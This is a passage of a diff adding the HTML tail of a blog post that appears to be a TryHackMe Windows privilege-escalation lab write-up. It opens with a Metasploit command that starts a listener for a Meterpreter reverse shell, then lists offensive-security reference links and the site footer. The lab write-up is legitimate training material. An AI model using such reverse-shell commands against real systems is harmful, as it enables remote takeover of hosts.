+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfconsole -x <span class="s2">&#34;use exploit/multi/handler;set LHOST &lt;ip&gt;;set LPORT &lt;port&gt;;set payload windows/meterpreter/reverse_tcp;run&#34;</span></span></span></code></pre></div></div>
+<h3 id="useful-resources-">Useful Resources :</h3>
+<ul>
+<li><a href="https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html" target="_blank" rel="noopener noreffer ">Potatoes_Windows_Privesc</a></li>
+<li><a href="https://nored0x.github.io/red-teaming/windows-enumeration/" target="_blank" rel="noopener noreffer ">windows-enumeration</a></li>
+<li><a href="https://liberty-shell.com/sec/2018/02/10/msfv/" target="_blank" rel="noopener noreffer ">msfveom-cheatsheet</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md" target="_blank" rel="noopener noreffer ">PayloadsAllTheThings</a></li>
+<li><a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation" target="_blank" rel="noopener noreffer ">hacktricks</a></li>
+<li><a href="https://lolbas-project.github.io/" target="_blank" rel="noopener noreffer ">lolbas-project</a></li>
+</ul></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-04-26</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://example.org/posts/windows-machines/2022-04-26-windowsprivescarena/" data-title="Windows-PrivEsc-Arena TryHackMe writeup" data-via="tinkerhell1337" data-hashtags="TryHackme,windows-privesc"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/posts/windows-machines/2022-04-26-windowsprivescarena/" data-hashtag="TryHackme"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="http://example.org/posts/windows-machines/2022-04-26-windowsprivescarena/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2fexample.org%2fposts%2fwindows-machines%2f2022-04-26-windowsprivescarena%2f&amp;text=Windows-PrivEsc-Arena%20TryHackMe%20writeup" target="_blank" title="Share on Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/tryhackme/">TryHackme</a>,&nbsp;<a href="/tags/windows-privesc/">Windows-Privesc</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/linux-machines/2022-01-21-backdoor/" class="prev" rel="prev" title="Backdoor Hackthebox writeup"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Backdoor Hackthebox writeup</a>
+            <a href="/posts/web-exploitation/2022-05-02-hacker-ts/" class="next" rel="next" title="Hacker Ts challenge writeup">Hacker Ts challenge writeup<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.150.1">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.1-DEV"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">0xMesbaha</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.2/sharer.min.js"></script><script>window.config={"comment":{}};</script><script src="/js/theme.min.js"></script></body>
+</html>
